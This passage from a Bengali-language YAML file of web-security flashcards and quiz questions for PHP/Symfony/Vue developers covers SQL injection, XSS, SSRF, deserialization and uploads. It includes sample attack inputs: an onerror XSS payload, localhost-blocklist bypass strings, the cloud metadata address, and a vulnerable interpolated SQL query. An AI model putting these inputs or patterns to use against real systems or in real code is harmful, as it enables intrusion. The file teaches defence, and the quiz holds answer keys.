      `setParameter('email', $email)` বা DBAL-এর `['email' => $email]` মানকে ডেটাবেসে আলাদা পথে পাঠায়, তাই মান কখনো নির্দেশ হয় না। escape বা blocklist ভরসা নয়। ORM ব্যবহার করলেও raw string জুড়লে একই ফাঁদ।
    ref: sql-injection
  - q: 'ORDER BY-র কলামের নাম ব্যবহারকারী দিলে কী করবেন?'
    a: 'Parameter করা যায় না; তাই অনুমোদিত কলামের allowlist-এর সাথে মিলিয়ে শুধু সেটাই বসান।'
    more: |
      Parameter শুধু মান (value) বসায়, কলাম বা table-এর নাম নয়। তাই `$sort` কে `['price', 'created_at']`-এর সাথে মিলিয়ে নিন; না মিললে ডিফল্ট ধরুন। কখনো ব্যবহারকারীর string সরাসরি SQL-এ বসাবেন না।
    ref: sql-injection
  - q: 'XSS (cross-site scripting) কী?'
    a: 'আক্রমণকারীর লেখা script অন্য ব্যবহারকারীর ব্রাউজারে সাইটের অংশ হিসেবে চলা।'
    more: |
      কমেন্ট বা নাম পাতায় বসানোর সময় escape না করলে ব্রাউজার সেটাকে HTML ধরে চালায়। তখন সেই script session বা token চুরি করতে পারে, ব্যবহারকারীর হয়ে কাজ করতে পারে। Twig আর Vue-র `{{ }}` ডিফল্টে escape করে।
    ref: xss
  - q: 'কোন দুটো জিনিস XSS-এর প্রধান দরজা?'
    a: 'Vue-র `v-html` আর Twig-এর `|raw`: দুটোই escape বন্ধ করে ব্যবহারকারীর লেখাকে HTML হিসেবে চালায়।'
    more: |
      সত্যিই rich text দেখাতে হলে সার্ভারে HtmlSanitizer দিয়ে শুধু নিরাপদ ট্যাগ রেখে তারপর দেখান। এর ওপরে CSP header দিলে ইনলাইন script আটকায়, ফলে একটা ভুল হলেও ক্ষতি সীমিত থাকে।
    ref: xss
  - q: 'Rich-text কমেন্ট ব্রাউজারে পরিষ্কার করবেন, না সার্ভারে?'
    a: 'সার্ভারে, সেভের সময়, HtmlSanitizer দিয়ে। শুধু ব্রাউজারে DOMPurify চালালে কেবল সেই একটা client বাঁচে।'
    more: |
      একই কমেন্ট মোবাইল অ্যাপ বা ইমেইলে দেখালে সেখানে কাঁচা HTML-ই যায়। সার্ভারে একবার পরিষ্কার করলে সব client ঢাকা পড়ে; চাইলে দ্বিতীয় স্তর হিসেবে DOMPurify-ও রাখুন। দাম: কয়েক লাইন config আর একটা sanitize() কল।
    ref: xss
  - q: 'SSRF কী, আর কোন ফিচারে সবচেয়ে বেশি দেখা যায়?'
    a: 'ব্যবহারকারীর দেওয়া URL-এ সার্ভার request পাঠায় এবং ভেতরের নেটওয়ার্কে পৌঁছে যায়। ছবি import, webhook URL, link preview-তে।'
    more: |
      সবচেয়ে বিপজ্জনক লক্ষ্য ক্লাউড metadata ঠিকানা (169.254.169.254), যা সার্ভারের access key দেয়। প্রতিকার: host allowlist, private IP বন্ধ (`NoPrivateNetworkHttpClient`), redirect বন্ধ, আর egress firewall।
    ref: ssrf
  - q: 'Unsafe deserialization কেন বিপজ্জনক?'
    a: 'unserialize() আক্রমণকারীর বানানো যেকোনো class-এর object তৈরি করে, যার magic method খোলামাত্র কোড চালাতে পারে।'
    more: |
      PHP-র `__destruct`, `__wakeup` এসব method object বানানো বা ফেলার সময় নিজে চলে। অ্যাপ বা library-র কোনো class-এর ভেতরে এমন শিকল খুঁজে আক্রমণকারী ক্ষতিকর কোড চালায়। সমাধান: অবিশ্বস্ত ডেটা JSON হিসেবে নিয়ে DTO-তে বসান।
    ref: unsafe-deserialization
  - q: 'ফাইল আপলোডে ক্লায়েন্টের দেওয়া নাম আর type কেন বিশ্বাস করা যায় না?'
    a: 'দুটোই ক্লায়েন্ট বদলাতে পারে। ফাইলের আসল ধরন content থেকে যাচাই করুন, নাম নিজে বানান।'
    more: |
      shell.php-কে image/jpeg বলে পাঠানো সহজ। তাই Symfony-র `Assert\Image` বা `Assert\File` content দেখে ধরন বলে। নাম নিজে UUID দিন, সাইজের সীমা রাখুন, আর ফাইল web root-এর বাইরে রাখুন।
    ref: safe-file-uploads

quiz:
  - q: 'নিচের endpoint-এ কোন সমস্যাটা আছে?'
    lang: php
    code: |
      #[Route('/orders', methods: ['POST'])]
      public function create(Request $request): JsonResponse
      {
          $data = json_decode($request->getContent(), true);
          $qty = $data['quantity'];

          return $this->json($this->orders->place($data['sku'], $qty));
      }
    hint: 'quantity কী টাইপের কী মান আসতে পারে? sku আদৌ আছে কি?'
    options:
      - text: 'কোনো যাচাই নেই: quantity ঋণাত্মক, string বা অনুপস্থিত হতে পারে'
        correct: true
        why: '#[MapRequestPayload] আর DTO-তে type আর Range দিলে এগুলো সার্ভার-সীমানাতেই আটকে যায়।'
      - text: 'json_decode ধীর, simplexml ব্যবহার করা উচিত'
        correct: false
        why: 'গতি এখানে সমস্যা নয়; সমস্যা যাচাইহীন মান।'
      - text: 'POST না হয়ে GET হওয়া উচিত'
        correct: false
        why: 'অর্ডার তৈরিতে POST-ই ঠিক। HTTP method এখানে নিরাপত্তার সমস্যা নয়।'
      - text: 'সব ঠিক আছে, কারণ Vue ফর্মে check আছে'
        correct: false
        why: 'curl দিয়ে সরাসরি request পাঠালে Vue-র check ছোঁয়াও যায় না।'
    ref: validate-at-the-door
  - q: 'নিচের কোড কীভাবে ঠিক করবেন?'
    lang: php
    code: |
      $sql = "SELECT * FROM orders WHERE user_id = {$userId} AND status = '{$status}'";
      $rows = $connection->executeQuery($sql)->fetchAllAssociative();
    hint: 'মান আর SQL আলাদা পথে যাওয়া দরকার।'
    options:
      - text: 'addslashes($status) দিয়ে status-টা escape করা'
        correct: false
        why: 'escape ভঙ্গুর; character set-এর কিছু চালে ভেঙে যায়, আর $userId-তে তো quote-ই লাগে না।'
      - text: '$status শুধু ছোট হাতের অক্ষর কি না regex দিয়ে দেখা'
        correct: false
        why: 'এটা অতিরিক্ত যাচাই হিসেবে ভালো, কিন্তু মূল সমাধান নয়; query-র গঠন একই থেকে যায়।'
      - text: 'executeQuery দুই parameter-সহ: ... WHERE user_id = :uid AND status = :st'
        correct: true
        why: 'দুটো মানই parameter হয়ে ডেটাবেসে আলাদা পথে যায়, তাই কখনো SQL নির্দেশ হয় না।'
      - text: 'ডেটাবেসের ইউজারকে শুধু read অধিকার দেওয়া'
        correct: false
        why: 'ক্ষতি কমায়, কিন্তু injection-এ সব ডেটা পড়া তখনো সম্ভব। এটা অতিরিক্ত স্তর, মূল সমাধান নয়।'
    ref: sql-injection
  - q: 'কমেন্টের জায়গায় কোন কোন কাজ XSS-এর ঝুঁকি তৈরি করে?'
    hint: 'কোনগুলো ব্যবহারকারীর লেখা escape ছাড়াই পাতায় বসায়?'
    options:
      - text: 'Vue-তে <div v-html="comment.body">'
        correct: true
        why: 'v-html লেখাকে HTML হিসেবে চালায়; <img onerror=...> চলে যাবে।'
      - text: 'Twig-এ {{ comment.body|raw }}'
        correct: true
        why: '|raw অটো-escape বন্ধ করে; ব্যবহারকারীর লেখায় এটা বিপজ্জনক।'
      - text: 'Vue-তে {{ comment.body }}'
        correct: false
        why: 'ডিফল্টে escape হয়; script ট্যাগ লেখা হয়ে দেখায়, চলে না।'
      - text: 'HtmlSanitizer দিয়ে পরিষ্কার করে তারপর দেখানো'
        correct: false
        why: 'এটাই প্রতিকার: শুধু নিরাপদ ট্যাগ থাকে, script বা event handler বাদ যায়।'
    ref: xss
  - q: 'করিম কমেন্ট দিল `<b>Nice</b><img src=x onerror=steal()>`। রহিম bold-টা রাখতে চায়। কোন সমাধান ঠিক?'
    hint: 'কোন সমাধান বিপজ্জনক অংশ ফেলে নিরীহ অংশ রাখে?'
    options:
      - text: 'HTML sanitize করা (সার্ভারে HtmlSanitizer, বা DOMPurify) আর পরিষ্কার ফলাফল দেখানো'
        correct: true
        why: 'bold ট্যাগ থাকে, onerror attribute কাটা পড়ে, তাই কিছু চলে না।'
      - text: 'সব কমেন্ট থেকে "script" শব্দটা মুছে দেওয়া'
        correct: false
        why: 'ওপরের আক্রমণে "script" শব্দই নেই; blocklist সবসময় কোনো একটা রূপ ফসকায়।'
      - text: 'v-html রেখে শুধু Content-Security-Policy header যোগ করা'
        correct: false
        why: 'CSP ভালো দ্বিতীয় প্রাচীর, কিন্তু একা থাকলে ফাঁক খোলাই থাকে, শুধু ক্ষতি সীমিত হয়।'
      - text: '{{ comment.body }} ব্যবহার করা'
        correct: false
        why: 'এটা নিরাপদ, কিন্তু তখন bold ট্যাগটা লেখা হয়েই দেখায়, ফিচারটাই হারায়।'
    ref: xss
  - q: 'রাশেদের অ্যাপে "URL দিয়ে ছবি import" ফিচার আছে। কোন ব্যবস্থাটা SSRF সবচেয়ে ভালো ঠেকায়?'
    hint: 'সার্ভার কোথায় যেতে পারবে, তার তালিকা কে ঠিক করবে?'
    options:
      - text: 'URL-এ "localhost" শব্দ আছে কি না দেখা'
        correct: false
        why: 'blocklist ফাঁকি দেওয়া সহজ: 127.1, [::1], বা এমন DNS নাম যা 127.0.0.1 দেখায়।'
      - text: 'host allowlist, private IP আটকানো (NoPrivateNetworkHttpClient), redirect বন্ধ'
        correct: true
        why: 'তিনটা স্তরে আটকায়: অনুমোদিত host, resolved IP, আর redirect-এর চাল।'
      - text: 'শুধু https ছাড়া অন্য scheme বাতিল করা'
        correct: false
        why: 'https দিয়েও ভেতরের নেটওয়ার্কে যাওয়া যায়; scheme যাচাই অংশ মাত্র।'
      - text: 'response-এর সাইজ ছোট রাখা'
        correct: false
        why: 'সাইজের সীমা DoS-এ কাজে লাগে, কিন্তু ছোট উত্তরেও access key বেরিয়ে যায়।'
    ref: ssrf
  - q: 'কোনগুলো unserialize()-এর নিরাপদ বিকল্প বা প্রতিকার?'
    hint: 'যে পথে কোনো class-এর কোড নিজে চালু হয় না, সেটা খুঁজুন।'
    options:
      - text: 'ডেটা JSON-এ নিয়ে #[MapRequestPayload] দিয়ে DTO-তে পড়া'
        correct: true
        why: 'JSON শুধু ডেটা; DTO-র ঘোষিত ঘরের বাইরে কিছু বসে না, তাই কোড চলে না।'
      - text: 'unserialize($data, [''allowed_classes'' => false])'
        correct: true
        why: 'object বানানোই বন্ধ, তাই magic method চলে না। তবু নতুন কোডে JSON-ই ভালো।'
      - text: 'serialize করা ডেটা base64 করে কুকিতে পাঠানো'
        correct: false
        why: 'base64 গোপনীয়তা বা সুরক্ষা নয়, আক্রমণকারী সহজেই decode ও encode করে।'
      - text: 'cart কুকির নাম গোপন রাখা'
        correct: false
        why: 'নাম গোপন রাখলে কিছু আটকায় না; কুকি ক্লায়েন্টের কাছে থাকে।'
    ref: unsafe-deserialization
  - q: 'আপলোড করা ফাইল সবচেয়ে নিরাপদে কীভাবে রাখবেন?'
    hint: 'ফাইলের নাম, জায়গা আর ধরন, তিনটাই কার হাতে থাকা উচিত?'
